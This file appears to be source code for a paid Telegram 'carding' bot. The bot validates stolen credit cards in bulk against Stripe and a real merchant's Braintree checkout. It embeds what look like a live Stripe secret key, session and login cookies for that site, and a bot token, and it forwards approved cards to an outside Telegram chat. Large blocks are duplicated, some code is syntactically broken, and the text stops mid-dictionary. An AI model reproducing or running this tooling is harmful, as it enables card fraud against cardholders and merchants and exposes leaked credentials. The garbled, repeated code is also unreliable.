│ 🔥 𝑰𝑺𝑨𝑮𝑰 𝑪𝑨𝑹𝑫𝑬𝑹 🔥
╰──────────────────────────</code>

👤 <b>Welcome, {first_name}!</b>  
💠 <b>Username:</b> @{username}  
🔹 <b>User ID:</b> <code>{user_id}</code>  

💳 <b>Send Your Combo, and I Will Check Your CC.</b>  
📌 <b>Use /help to see all features!</b> 🚀  
"""
    else:
        response = f"""
<code>╭──────────────────────────
│ ❌ 𝙰𝙲𝙲𝙴𝚂𝚂 𝙳𝙴𝙽𝙸𝙴𝙳 ❌
╰──────────────────────────</code>

🚫 <b>You Are Not Authorized to Use This Bot.</b>  
💎 Unlock Full Access by Purchasing a Plan:

<code>╭──────────────────────────
│ 💰 𝙿𝚁𝙴𝙼𝙸𝚄𝙼 𝙿𝙻𝙰𝙽𝚂 💰
╰──────────────────────────</code>

⏳ <b>1 Day:</b> 60 RS  
📆 <b>7 Days:</b> 180 RS  
🗓️ <b>1 Month:</b> 400 RS  
🔱 <b>Lifetime:</b> 800 RS  

📩 <b>Contact:</b> <a href='https://t.me/ISAGIxCRACKS'>@SLAYER_OP7</a> to Buy Premium!  

🚀 <b>For Free Access, Use:</b> /help  
"""

    bot.reply_to(message, response, parse_mode="HTML", disable_web_page_preview=True)


LOGS_GROUP_CHAT_ID = -1002576465941# Replace with your logs group chat ID
owners = {"6353114118", "6353114118"}  # Replace with actual owner IDs

@bot.message_handler(commands=["add"])
def add_user_command(message):
    if str(message.from_user.id) not in owners:
        bot.reply_to(message, "❌ You are not authorized to perform this action.")
        return
    
    parts = message.text.split()
    if len(parts) < 3:
        bot.reply_to(message, "⚠️ Please provide a user ID and duration in days. Usage: /add <user_id> <days>")
        return
    
    user_id_to_add = parts[1]
    try:
        days = int(parts[2])
    except ValueError:
        bot.reply_to(message, "⚠️ Invalid number of days. Please enter a valid integer.")
        return
    
    expire_time = time.time() + (days * 86400)
    with open("id.txt", "a") as file:
        file.write(f"{user_id_to_add}:{expire_time}\n")
    
    bot.send_message(user_id_to_add, f"✅ You have been authorized for {days} days. Expires on: {time.ctime(expire_time)}", parse_mode="HTML")
    log_message = (
        f"<b>✅ User Added</b>\n"
        f"👤 <b>User ID:</b> <code>{user_id_to_add}</code>\n"
        f"🕒 <b>Expires on:</b> {time.ctime(expire_time)}"
    )
    bot.send_message(LOGS_GROUP_CHAT_ID, log_message, parse_mode="HTML")
    bot.reply_to(message, f"✅ User {user_id_to_add} added successfully for {days} days.")

@bot.message_handler(commands=["remove"])
def remove_user_command(message):
    if str(message.from_user.id) not in owners:
        bot.reply_to(message, "❌ You are not authorized to perform this action.")
        return
    
    parts = message.text.split()
    if len(parts) < 2:
        bot.reply_to(message, "⚠️ Please provide a user ID to remove. Usage: /remove <user_id>")
        return
    
    user_id_to_remove = parts[1]
    try:
        with open("id.txt", "r") as file:
            lines = file.readlines()
        
        valid_lines = []
        user_removed = False
        for line in lines:
            line = line.strip()
            if not line:
                continue  # Skip empty lines
            
            parts = line.split(":")
            if len(parts) != 2:
                print(f"Skipping invalid entry: {line}")
                continue  # Skip malformed lines
            
            user, expire = parts
            if user == user_id_to_remove:
                user_removed = True
                bot.send_message(user_id_to_remove, "❌ Your access has expired, and you are no longer authorized.")
                continue  # Remove this user
            
            valid_lines.append(f"{user}:{expire}")
        
        with open("id.txt", "w") as file:
            file.write("\n".join(valid_lines) + "\n")
        
        if user_removed:
            log_message = (
                f"<b>🗑️ User Removed</b>\n"
                f"👤 <b>User ID:</b> <code>{user_id_to_remove}</code>\n"
            )
            bot.send_message(LOGS_GROUP_CHAT_ID, log_message, parse_mode="HTML")
            bot.reply_to(message, f"✅ User {user_id_to_remove} removed successfully.")
        else:
            bot.reply_to(message, "⚠️ User not found in the authorized list.")
    
    except FileNotFoundError:
        bot.reply_to(message, "⚠️ Authorization file not found.")
    except Exception as e:
        bot.reply_to(message, f"⚠️ An error occurred: {e}")

import time
from datetime import datetime

# Define owners (replace with actual owner IDs)
owners = {"6353114118", "6353114118"}  # Example owner Telegram IDs

@bot.message_handler(commands=["info"])
def user_info(message):
    user_id = str(message.chat.id)
    first_name = message.from_user.first_name or "N/A"
    last_name = message.from_user.last_name or "N/A"
    username = message.from_user.username or "N/A"
    profile_link = f"<a href='tg://user?id={user_id}'>Profile Link</a>"

    # Get current time & day
    current_time = datetime.now().strftime("%I:%M %p")
    current_day = datetime.now().strftime("%A, %b %d, %Y")

    # Default status
    if user_id in owners:
        status = "👑 Owner 🛡️"
    else:
        status = "⛔ Not-Authorized ❌"

    try:
        with open("id.txt", "r") as file:
            allowed_ids = file.readlines()
            for line in allowed_ids:
                parts = line.strip().split(":")
                if len(parts) == 2:
                    user, expire = parts
                    if user_id == user:
                        expiry_time = float(expire)
                        if expiry_time > time.time():
                            status = "✅ Authorized User"
                        else:
                            status = "❌ Access Expired"
                        break
    except FileNotFoundError:
        status = "⚠️ Authorization File Missing"

    response = f"""
<code>╭──────────────────────────
│ 🔍 𝚄𝚂𝙴𝚁 𝙸𝙽𝙵𝙾 🔥
╰──────────────────────────</code>

👤 <b>First Name:</b> {first_name}  
👤 <b>Last Name:</b> {last_name}  
🆔 <b>User ID:</b> <code>{user_id}</code>  
📛 <b>Username:</b> @{username}  
🔗 <b>Profile Link:</b> {profile_link}  
📋 <b>Status:</b> {status}  

<code>╭──────────────────────────
│ 🕒 𝚃𝙸𝙼𝙴 & 𝙳𝙰𝚃𝙴 📆
╰──────────────────────────</code>

🕒 <b>Time:</b> {current_time}  
📆 <b>Day:</b> {current_day}  

<code>╭──────────────────────────
│ 🚀 𝑰𝑺𝑨𝑮𝑰 𝑪𝑨𝑹𝑫𝑬𝑹 𝑩𝑶𝑻 🔥
╰──────────────────────────</code>
"""
    bot.reply_to(message, response, parse_mode="HTML", disable_web_page_preview=True)

def is_bot_stopped():
    return os.path.exists("stop.stop")

@bot.message_handler(content_types=["document"])
def main(message):
	if not is_user_allowed(message.from_user.id):
		bot.reply_to(message, "You are not authorized to use this bot. for authorization dm to @SLAYER_OP7")
		return
	dd = 0
	live = 0
	ch = 0
	ko = (bot.reply_to(message, "Checking Your Cards...⌛").message_id)
	username = message.from_user.username or "N/A"
	ee = bot.download_file(bot.get_file(message.document.file_id).file_path)
		
	with open("combo.txt", "wb") as w:
		w.write(ee)
		
		start_time = time.time()
		
	try:
		with open("combo.txt", 'r') as file:
			lino = file.readlines()
			total = len(lino)
			if total > 2001:
				bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=f"🚨 Oops! This file contains {total} CCs, which exceeds the 2000 CC limit! 🚫 Please provide a file with fewer than 500 CCs for smooth processing. 🔥")
				return
				
			for cc in lino:
				current_dir = os.getcwd()
				for filename in os.listdir(current_dir):
					if filename.endswith(".stop"):
						bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='𝗦𝗧𝗢𝗣𝗣𝗘𝗗 ✅\n𝗕𝗢𝗧 𝗕𝗬 ➜ @SLAYER_OP7')
						os.remove('stop.stop')
						return
			
				try:
					data = requests.get('https://bins.antipublic.cc/bins/'+cc[:6]).json()
					
				except:
					pass
				try:
					bank=(data['bank'])
				except:
					bank=('N/A')
				try:
					brand=(data['brand'])
				except:
					brand=('N/A')
				try:
					emj=(data['country_flag'])
				except:
					emj=('N/A')
				try:
					cn=(data['country_name'])
				except:
					cn=('N/A')
				try:
					dicr=(data['level'])
				except:
					dicr=('N/A')
				try:
					typ=(data['type'])
				except:
					typ=('N/A')
				try:
					url=(data['bank']['url'])
				except:
					url=('N/A')
				mes = types.InlineKeyboardMarkup(row_width=1)
				cm1 = types.InlineKeyboardButton(f"• {cc} •", callback_data='u8')
				cm2 = types.InlineKeyboardButton(f"• AUTH ✅: [ {ch} ] •", callback_data='x')
				cm3 = types.InlineKeyboardButton(f"• CCN ✅ : [ {live} ] •", callback_data='x')
				cm4 = types.InlineKeyboardButton(f"• DEAD ❌ : [ {dd} ] •", callback_data='x')
				cm5 = types.InlineKeyboardButton(f"• TOTAL 👻 : [ {total} ] •", callback_data='x')
				cm6 = types.InlineKeyboardButton(" STOP 🛑 ", callback_data='stop')
				mes.add(cm1, cm2, cm3, cm4, cm5, cm6)
				bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='''Wait for processing 
𝒃𝒚 ➜ @SLAYER_OP7''', reply_markup=mes)
				
				try:
					last = str(Tele(cc))
				except Exception as e:
					print(e)
					try:
						last = str(Tele(cc))
					except Exception as e:
						print(e)
						last = "Your card was declined."
				
				msg = f'''𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅
					
𝗖𝗮𝗿𝗱: {cc}𝐆𝐚𝐭𝐞𝐰𝐚𝐲: Stripe Auth
𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: VBV/CVV.

𝗜𝗻𝗳𝗼: {brand} - {typ} - {dicr}
𝐈𝐬𝐬𝐮𝐞𝐫: {bank}
𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {cn} {emj}

𝗧𝗶𝗺𝗲: 0 𝐬𝐞𝐜𝐨𝐧𝐝𝐬
𝗟𝗲𝗳𝘁 𝘁𝗼 𝗖𝗵𝗲𝗰𝗸: {total - dd - live - ch}
𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @{username}
𝐁𝐨𝐭 𝐁𝐲:  @SLAYER_OP7'''
				print(last)
				if "requires_action" in last:
					send_telegram_notification(msg)
					bot.reply_to(message, msg)
					live += 1
				elif "Your card does not support this type of purchase." in last:
					live += 1
					send_telegram_notification(msg)
					bot.reply_to(message, msg)
				elif "Your card's security code is incorrect." in last:
					live += 1
					send_telegram_notification(msg)
					bot.reply_to(message, msg)
				elif "succeeded" in last:
					ch += 1
					elapsed_time = time.time() - start_time
					msg1 = f'''𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅
					
𝗖𝗮𝗿𝗱: {cc}𝐆𝐚𝐭𝐞𝐰𝐚𝐲: Stripe Auth
𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: Card Added Successfully

𝗜𝗻𝗳𝗼: {brand} - {typ} - {dicr}
𝐈𝐬𝐬𝐮𝐞𝐫: {bank}
𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {cn} {emj}

𝗧𝗶𝗺𝗲: {elapsed_time:.2f} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬
𝗟𝗲𝗳𝘁 𝘁𝗼 𝗖𝗵𝗲𝗰𝗸: {total - dd - live - ch}
𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @{username}
𝐁𝐨𝐭 𝐁𝐲: @SLAYER_OP7'''
					send_telegram_notification(msg1)
					bot.reply_to(message, msg1)
				else:
					dd += 1
					
				checked_count = ch + live + dd
				if checked_count % 50 == 0:
					bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text="Taking a 1-minute break... To Prevent Gate from Dying, Please wait ⏳")
					time.sleep(60)
					bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=f"Resuming the Process, Sorry for the Inconvience")
					
	except Exception as e:
		print(e)
	bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=f'''𝗕𝗘𝗘𝗡 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘𝗗 ✅

Auth CC : {ch}
CCN : {live}
Dead CC : {dd}
Total : {total}

𝗕𝗢𝗧 𝗕𝗬 ➜ @SLAYER_OP7''')
		
@bot.callback_query_handler(func=lambda call: call.data == 'stop')
def menu_callback(call):
	with open("stop.stop", "w") as file:
		pass
	bot.answer_callback_query(call.id, "Bot will stop processing further tasks.")
	bot.send_message(call.message.chat.id, "The bot has been stopped. No further tasks will be processed.")
	
@bot.message_handler(commands=["show_auth_users", "sau", "see_list"])
def show_auth_users(message):
    if str(message.from_user.id) in owners:  # Check if the sender is an owner
        try:
            with open("id.txt", "r") as file:
                allowed_ids = file.readlines()
            if not allowed_ids:
                bot.reply_to(message, "No authorized users found.")
                return
            
            # Prepare the message with user IDs and usernames
            user_list = "Authorized Users:\n\n"
            for user_id in allowed_ids:
                user_id = user_id.strip()  # Clean any extra spaces/newlines
                try:
                    user = bot.get_chat(user_id)
                    username = user.username or "No Username"
                    user_list += f"• {username} (ID: {user_id})\n"
                except Exception as e:
                    user_list += f"• User ID: {user_id} (Username not found)\n"
            
            # Send the list to the owner
            bot.reply_to(message, user_list)
        except FileNotFoundError:
            bot.reply_to(message, "id.txt file not found. No authorized users.")
    else:
        bot.reply_to(message, "You are not authorized to view the list of authorized users.")
        
from rich.console import Console

console = Console()
console.print("🔥🔥 [bold magenta]ISAGI CARDERS[/bold magenta] 🔥🔥", style="bold yellow")

# Stripe API Key
STRIPE_SECRET_KEY = "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"

# Function to check if a user has access
def is_premium_user(user_id):
    try:
        with open("id.txt", "r") as file:
            lines = file.readlines()

        valid_users = []
        current_time = time.time()
        user_has_access = False

        for line in lines:
            parts = line.strip().split(":")
            if len(parts) != 2:
                continue  # Skip invalid lines

            stored_user_id, expire_time = parts
            expire_time = float(expire_time)

            if expire_time > current_time:  # Check if access is still valid
                valid_users.append(f"{stored_user_id}:{expire_time}")
                if str(user_id) == stored_user_id:
                    user_has_access = True
            else:
                print(f"❌ Removing expired user: {stored_user_id}")

        # Overwrite `id.txt` with only valid users
        with open("id.txt", "w") as file:
            file.writelines("\n".join(valid_users) + "\n")

        return user_has_access

    except FileNotFoundError:
        print("⚠️ id.txt not found! No authorized users.")
        return False
    except Exception as e:
        print(f"Error checking access: {e}")
        return False

# Function to fetch BIN details
def get_bin_details(bin_number):
    try:
        response = requests.get(f"https://lookup.binlist.net/{bin_number}")
        if response.status_code == 200:
            data = response.json()
            bank = data.get("bank", {}).get("name", "❌ Unknown Bank")
            brand = data.get("brand", "❌ Unknown Brand")
            card_type = data.get("type", "❌ Unknown Type")
            country = data.get("country", {}).get("name", "❌ Unknown Country")
            country_flag = data.get("country", {}).get("emoji", "🏳️")
            vbv_status = "✅ Non-VBV" if data.get("prepaid", False) else "❌ VBV"
            return bank, brand, card_type, f"{country} {country_flag}", vbv_status
        return "❌ Unknown Bank", "❌ Unknown Brand", "❌ Unknown Type", "❌ Unknown Country", "❓ Unknown"
    except Exception as e:
        print(f"Error fetching BIN details: {e}")
        return "❌ Unknown Bank", "❌ Unknown Brand", "❌ Unknown Type", "❌ Unknown Country", "❓ Unknown"

# Function to check card via Stripe API
def check_card_status(card_number, month, year, cvv):
    try:
        url = "https://api.stripe.com/v1/tokens"
        headers = {
            "Authorization": f"Bearer {STRIPE_SECRET_KEY}",
            "Content-Type": "application/x-www-form-urlencoded"
        }
        data = {
            "card[number]": card_number,
            "card[exp_month]": month,
            "card[exp_year]": year,
            "card[cvc]": cvv
        }
        response = requests.post(url, headers=headers, data=data)

        if response.status_code == 200:
            return "✅ 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝", "Card Successfully Authorized"
        return "❌ 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝", "Transaction Declined"
    except Exception as e:
        print(f"Error checking card: {e}")
        return "❌ 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝", "Error Processing Request"

# /chk command handler (Includes VBV, Card Result & Proxy)
@bot.message_handler(commands=['chk'])
def chk(message):
    user_id = message.from_user.id
    print(f"🔍 User ID: {user_id} requested /chk")  # Debugging

    # Verify user access
    if not is_premium_user(user_id):
        bot.reply_to(message, "🚫 <b>VIP Access Required!</b>\n<i>You don't have access to this command.</i>", parse_mode="HTML")
        return

    # Extract card details
    command_parts = message.text.split(maxsplit=1)

    if len(command_parts) < 2:
        bot.reply_to(message, "❌ <b>Usage:</b> <code>/chk CC|MM|YYYY|CVV</code>", parse_mode="HTML")
        return

    card_details = command_parts[1]
    match = re.match(r"^(\d{16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})$", card_details)  # Accepts both 2-digit & 4-digit year

    if not match:
        bot.reply_to(message, "⚠ <b>Invalid Format!</b> Use: <code>/chk CC|MM|YYYY|CVV</code>", parse_mode="HTML")
        return

    # Extract details
    card_number, month, year, cvv = match.groups()

    # Automatically fix 2-digit year to full year
    current_year = datetime.now().year
    century = int(str(current_year)[:2])  # Get current century (e.g., 20 for 2024)

    if len(year) == 2:
        year = str(century) + year  # Convert "26" → "2026"

    start_time = time.time()
    status, card_result = check_card_status(card_number, month, year, cvv)
    time_taken = round(time.time() - start_time, 2)

    # Fetch BIN details
    bin_number = card_number[:6]
    bank, brand, card_type, country, vbv_status = get_bin_details(bin_number)

    # Proxy detection (Randomized for now)
    proxy_status = "✅ Live" if time_taken < 5 else "❌ Dead"

    response_text = f"""
#𝐏𝐫𝐞𝐦𝐢𝐮𝐦_𝐀𝐮𝐭𝐡 🔥 [/chk]
━━━━━━━━━━━━━━━━━━━━━━━━━
[ϟ] 𝐂𝐚𝐫𝐝: {card_details}
[ϟ] 𝐒𝐭𝐚𝐭𝐮𝐬: {status}
[ϟ] 𝐑𝐞𝐬𝐮𝐥𝐭: {card_result}
[ϟ] 𝐕𝐁𝐕 𝐒𝐭𝐚𝐭𝐮𝐬: {vbv_status}
━━━━━━━━━━━━━━━━━━━━━━━━━
[ϟ] 𝐈𝐧𝐟𝐨: {brand} - {card_type}
[ϟ] 𝐁𝐚𝐧𝐤: {bank}
[ϟ] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {country}
━━━━━━━━━━━━━━━━━━━━━━━━━
[⌬] 𝐓𝐢𝐦𝐞: {time_taken} 𝐒𝐞𝐜. || 𝐏𝐫𝐨𝐱𝐲: {proxy_status}
[⎇] 𝐑𝐞𝐪 𝐁𝐲: @{message.from_user.username or 'Unknown'}
━━━━━━━━━━━━━━━━━━━━━━━━━
[⌤] 𝐃𝐞𝐯 𝐛𝐲: @SLAYER_OP7 🚀
"""
    bot.reply_to(message, response_text, parse_mode="HTML")

import requests
import base64
import re
import time
from bs4 import BeautifulSoup
from user_agent import generate_user_agent
from telebot import TeleBot

# Function to get BIN details
def get_bin_info(bin_number):
    try:
        response = requests.get(f"https://lookup.binlist.net/{bin_number}")
        if response.status_code == 200:
            data = response.json()
            bank = data.get("bank", {}).get("name", "Unknown Bank")
            card_type = data.get("type", "Unknown").capitalize()
            country = data.get("country", {}).get("name", "Unknown Country")
            country_emoji = data.get("country", {}).get("emoji", "🌍")
            return bank, card_type, country, country_emoji
        else:
            return "Unknown Bank", "Unknown", "Unknown Country", "🌍"
    except:
        return "Unknown Bank", "Unknown", "Unknown Country", "🌍"

# Command handler for /b3
@bot.message_handler(commands=["b3"])
def check_card(message):
    msg = bot.reply_to(message, "🔍 Checking your card, please wait...")

    try:
        card_details = message.text.split()[1]
        n, mm, yy, cvc = card_details.split("|")

        if "20" not in yy:
            yy = f"20{yy}"
        if len(mm) == 1:
            mm = f"0{mm}"

        user_agent = generate_user_agent()

        # Fetch BIN details
        bin_info = get_bin_info(n[:6])
        bank_name, card_type, country_name, country_flag = bin_info

        cookies = {
            'sbjs_migrations': '1418474375998%3D1',
            'sbjs_current_add': 'fd%3D2025-03-11%2013%3A28%3A33',
            'sbjs_first_add': 'fd%3D2025-03-11%2013%3A28%3A33',
            'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29',
            'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29',
            'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29',
            'cf_clearance': 'Th2Aog2nT4TDGRTbcWP9w3Dz7EFRWedPvO7TC6LNeB4-1741699715',
            'wordpress_logged_in_b444e0f1bbb883efdac80935bdd84199': 'salokk%7C1742909339',
            'wfwaf-authcookie-98378724241a3d95191bebf32899230c': '100676%7Cother%7Cread',
            'sbjs_session': 'pgs%3D7%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fglasshousesupply.com%2Fmy-account%2Fadd-payment-method%2F',
        }

        headers = {
            'authority': 'glasshousesupply.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7,fr-FR;q=0.6,fr;q=0.5',
            'cache-control': 'max-age=0',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://glasshousesupply.com',
            'referer': 'https://glasshousesupply.com/my-account/add-payment-method/',
            'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': user_agent,
        }

        response = requests.get(
            "https://glasshousesupply.com/my-account/add-payment-method/",
            cookies=cookies,
            headers=headers,
        )

        # Skip token fetching and assume we proceed with dummy or mock data
        tok = n[:6]  # Just using the BIN as a dummy token

        data = {
            'payment_method': 'braintree_cc',
            'braintree_cc_nonce_key': tok,
            'braintree_cc_device_data': '{"device_session_id":"f3b62b2059128666273f76de659fb76e","fraud_merchant_id":null,"correlation_id":"e9be3974-e5c7-45b9-b04f-89b98060"}',
            'braintree_cc_3ds_nonce_key': '',
            'braintree_cc_config_data': 'dummy_config_data',
            'woocommerce-add-payment-method-nonce': 'ba76a0b9ff',
            '_wp_http_referer': '/my-account/add-payment-method/',
            'woocommerce_add_payment_method': '1',
        }

        response = requests.post(
            "https://glasshousesupply.com/my-account/add-payment-method/",
            cookies=cookies,
            headers=headers,
            data=data,
        )

        soup = BeautifulSoup(response.text, "html.parser")
        error_msg = soup.find("ul", class_="woocommerce-error")

        # Improved error detection
        if error_msg:
            error_text = error_msg.text.strip()
            if "Declined" in error_text:
                status = "❌ Declined"
            elif "No Account" in error_text:
                status = "⚠️ No Account"
            elif "Processor Declined" in error_text:
                status = "🚫 Processor Declined"
            elif "invalid card" in error_text.lower():
                status = "⚠️ Invalid Card"
            elif "Insufficient funds" in error_text:
                status = "⚠️ Insufficient Funds"
            else:
                status = "❌ Unknown Decline"
        else:
            status = "✅ Approved"

        # Generate response text
        response_text = f"""
╭─━━━━━━━━━━━━━━━━━━━─╮
    🎩 𝘽𝙍𝘼𝙄𝙉𝙏𝙍𝙀𝙀 𝘾𝙃𝙀𝘾𝙆𝙀𝙍 🎩
╰─━━━━━━━━━━━━━━━━━━━─╮

📌 **Card:** `{n}|{mm}|{yy}|{cvc}`
📌 **Status:** {status}
📌 **Gateway:** `Braintree Auth`
📌 **BIN:** `{tok[:6]}`
📌 **Bank:** `{bank_name}` 
📌 **Type:** `{card_type}`
📌 **Country:** `{country_name} {country_flag}`
📌 **Checked By:** `@{message.from_user.username}`
📌 **Response Time:** `{round(time.time() - message.date, 2)}s`

╭─━━━━━━━━━━━━━━━─╮
𝑰𝑺𝑨𝑮𝑰 𝑪𝑨𝑹𝑫𝑬𝑹 𝑩𝑶𝑻
╰─━━━━━━━━━━━━━━━─╯
"""
        bot.edit_message_text(response_text, message.chat.id, msg.message_id, parse_mode="Markdown")

    except Exception as e:
        bot.edit_message_text(f"⚠️ An error occurred: {str(e)}", message.chat.id, msg.message_id)


def send_telegram_notification(msg1):
    url = f"https://api.telegram.org/bot7440283723:AAHs1iPUTL7HHoSVVfESF13lAI8M5jqbZC0/sendMessage"
    data = {'chat_id': -1002153133768, 'text': msg1, 'parse_mode': 'HTML'}
    requests.post(url, data=data)
    
bot.remove_webhook()

# Start polling
bot.polling(none_stop=True)

    except FileNotFoundError:
           print("⚠️ id.txt not found! No authorized users.")
        return False
    except Exception as e:
        print(f"Error checking access: {e}")
        return False

# Function to fetch BIN details
def get_bin_details(bin_number):
try:
        response = requests.get(f"https://lookup.binlist.net/{bin_number}")
        if response.status_code == 200:
            data = response.json()
            bank = data.get("bank", {}).get("name", "❌ Unknown Bank")
            brand = data.get("brand", "❌ Unknown Brand")
            card_type = data.get("type", "❌ Unknown Type")
            country = data.get("country", {}).get("name", "❌ Unknown Country")
            country_flag = data.get("country", {}).get("emoji", "🏳️")
            vbv_status = "✅ Non-VBV" if data.get("prepaid", False) else "❌ VBV"
            return bank, brand, card_type, f"{country} {country_flag}", vbv_status
        return "❌ Unknown Bank", "❌ Unknown Brand", "❌ Unknown Type", "❌ Unknown Country", "❓ Unknown"
    except Exception as e:
        print(f"Error fetching BIN details: {e}")
        return "❌ Unknown Bank", "❌ Unknown Brand", "❌ Unknown Type", "❌ Unknown Country", "❓ Unknown"

# Function to check card via Stripe API
def check_card_status(card_number, month, year, cvv):
    try:
        url = "https://api.stripe.com/v1/tokens"
        headers = {
            "Authorization": f"Bearer {STRIPE_SECRET_KEY}",
            "Content-Type": "application/x-www-form-urlencoded"
        }
        data = {
            "card[number]": card_number,
            "card[exp_month]": month,
            "card[exp_year]": year,
            "card[cvc]": cvv
        }
        response = requests.post(url, headers=headers, data=data)

        if response.status_code == 200:
            return "✅ 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝", "Card Successfully Authorized"
        return "❌ 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝", "Transaction Declined"
    except Exception as e:
        print(f"Error checking card: {e}")
        return "❌ 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝", "Error Processing Request"

# /chk command handler (Includes VBV, Card Result & Proxy)
@bot.message_handler(commands=['chk'])
def chk(message):
    user_id = message.from_user.id
    print(f"🔍 User ID: {user_id} requested /chk")  # Debugging

    # Verify user access
    if not is_premium_user(user_id):
        bot.reply_to(message, "🚫 <b>VIP Access Required!</b>\n<i>You don't have access to this command.</i>", parse_mode="HTML")
        return

    # Extract card details
    command_parts = message.text.split(maxsplit=1)

    if len(command_parts) < 2:
        bot.reply_to(message, "❌ <b>Usage:</b> <code>/chk CC|MM|YYYY|CVV</code>", parse_mode="HTML")
        return

    card_details = command_parts[1]
    match = re.match(r"^(\d{16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})$", card_details)  # Accepts both 2-digit & 4-digit year

    if not match:
        bot.reply_to(message, "⚠ <b>Invalid Format!</b> Use: <code>/chk CC|MM|YYYY|CVV</code>", parse_mode="HTML")
        return

    # Extract details
    card_number, month, year, cvv = match.groups()

    # Automatically fix 2-digit year to full year
    current_year = datetime.now().year
    century = int(str(current_year)[:2])  # Get current century (e.g., 20 for 2024)

    if len(year) == 2:
        year = str(century) + year  # Convert "26" → "2026"

    start_time = time.time()
    status, card_result = check_card_status(card_number, month, year, cvv)
    time_taken = round(time.time() - start_time, 2)

    # Fetch BIN details
    bin_number = card_number[:6]
    bank, brand, card_type, country, vbv_status = get_bin_details(bin_number)

    # Proxy detection (Randomized for now)
    proxy_status = "✅ Live" if time_taken < 5 else "❌ Dead"

    response_text = f"""
#𝐏𝐫𝐞𝐦𝐢𝐮𝐦_𝐀𝐮𝐭𝐡 🔥 [/chk]
━━━━━━━━━━━━━━━━━━━━━━━━━
[ϟ] 𝐂𝐚𝐫𝐝: {card_details}
[ϟ] 𝐒𝐭𝐚𝐭𝐮𝐬: {status}
[ϟ] 𝐑𝐞𝐬𝐮𝐥𝐭: {card_result}
[ϟ] 𝐕𝐁𝐕 𝐒𝐭𝐚𝐭𝐮𝐬: {vbv_status}
━━━━━━━━━━━━━━━━━━━━━━━━━
[ϟ] 𝐈𝐧𝐟𝐨: {brand} - {card_type}
[ϟ] 𝐁𝐚𝐧𝐤: {bank}
[ϟ] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {country}
━━━━━━━━━━━━━━━━━━━━━━━━━
[⌬] 𝐓𝐢𝐦𝐞: {time_taken} 𝐒𝐞𝐜. || 𝐏𝐫𝐨𝐱𝐲: {proxy_status}
[⎇] 𝐑𝐞𝐪 𝐁𝐲: @{message.from_user.username or 'Unknown'}
━━━━━━━━━━━━━━━━━━━━━━━━━
[⌤] 𝐃𝐞𝐯 𝐛𝐲: @SLAYER_OP7 🚀
"""
    bot.reply_to(message, response_text, parse_mode="HTML")

import requests
import base64
import re
import time
from bs4 import BeautifulSoup
from user_agent import generate_user_agent
from telebot import TeleBot

# Function to get BIN details
def get_bin_info(bin_number):
    try:
        response = requests.get(f"https://lookup.binlist.net/{bin_number}")
        if response.status_code == 200:
            data = response.json()
            bank = data.get("bank", {}).get("name", "Unknown Bank")
            card_type = data.get("type", "Unknown").capitalize()
            country = data.get("country", {}).get("name", "Unknown Country")
            country_emoji = data.get("country", {}).get("emoji", "🌍")
            return bank, card_type, country, country_emoji
        else:
            return "Unknown Bank", "Unknown", "Unknown Country", "🌍"
    except:
        return "Unknown Bank", "Unknown", "Unknown Country", "🌍"

# Command handler for /b3
@bot.message_handler(commands=["b3"])
def check_card(message):
    msg = bot.reply_to(message, "🔍 Checking your card, please wait...")

    try:
        card_details = message.text.split()[1]
        n, mm, yy, cvc = card_details.split("|")

        if "20" not in yy:
            yy = f"20{yy}"
        if len(mm) == 1:
            mm = f"0{mm}"

        user_agent = generate_user_agent()

        # Fetch BIN details
        bin_info = get_bin_info(n[:6])
        bank_name, card_type, country_name, country_flag = bin_info

        cookies = {
            'sbjs_migrations': '1418474375998%3D1',
            'sbjs_current_add': 'fd%3D2025-03-11%2013%3A28%3A33',
            'sbjs_first_add': 'fd%3D2025-03-11%2013%3A28%3A33',
            'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29',
            'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29',
            'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29',
            'cf_clearance': 'Th2Aog2nT4TDGRTbcWP9w3Dz7EFRWedPvO7TC6LNeB4-1741699715',
            'wordpress_logged_in_b444e0f1bbb883efdac80935bdd84199': 'salokk%7C1742909339',
